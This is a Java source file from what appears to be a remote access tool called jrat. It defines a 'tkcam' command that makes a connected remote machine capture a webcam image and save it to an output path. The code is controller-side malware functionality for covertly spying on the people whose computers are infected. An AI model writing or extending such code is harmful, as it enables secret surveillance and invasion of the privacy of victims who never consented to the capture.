package net.jrat.core.command.commands.connection;

import java.io.File;

import org.apache.commons.cli.CommandLine;

import net.jrat.core.command.Command;
import net.jrat.core.packet.server.S9PacketWebcam;
import net.jrat.utils.Variables;

public class TakeWebcam extends Command
{
	public TakeWebcam()
	{
		super("tkcam", new String[] { "opath" }, new String[] { "sets the output path" }, "takes a capture of the webcam (jpg)");
	}
	
	@Override
	public void execute(CommandLine commandLine) throws Exception
	{
		if(this.server.currentConnection == null)
			throw new Exception("current connection is equal to null");
		
		final String opath = commandLine.getOptionValue("opath", Variables.instance.workDir + "shots" + File.separator + "webcam.jpg");
		this.server.currentConnection.outputStream.writeObject(new S9PacketWebcam(opath));
	}
}